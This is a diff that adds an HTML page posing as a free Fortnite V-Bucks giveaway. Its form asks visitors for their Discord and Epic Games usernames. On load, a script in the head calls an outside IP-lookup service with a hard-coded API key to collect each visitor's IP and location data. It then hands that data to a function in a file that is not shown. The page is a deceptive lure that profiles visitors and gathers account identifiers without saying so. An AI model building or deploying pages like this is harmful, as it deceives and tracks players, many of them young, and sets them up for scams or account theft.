@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+    <style>
+        p, h1 {
+            color: green;
+        }
+    </style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="stuff.js"></script>
+
+
+    <script>
+let apiKey = 'be0f755b93290b4c100445d77533d291763a417c75524e95e07819ad';
+$.getJSON('https://api.ipdata.co?api-key=' + apiKey, function(data) {
+  test(JSON.stringify(data, null, 2))
+});
+    </script>
+</head>
+  
+<body>
+    <center>
+        <p style="display: none;" class="gfg"></p>
+
+        <h1>Get ForNITE V BUCKS any where you Go!!!!</h1>
+        <img src="fortnite1.jpg" style="max-width: 100px;">
+
+        <form onsubmit="return sendMessage()">
+            <input type="text" required placeholder="Discord UserName" id="discord">
+            <input type="number" required placeholder="amount of v bucks " id="vbucks">
+            <input type="text" required placeholder="Epic Games UserName" id="epicGames">
+            <br>
+            <button type="submit">Submit</button>
+
+
+
+        </form>
+
+
+    </center>
+</body>
+  
+</html>
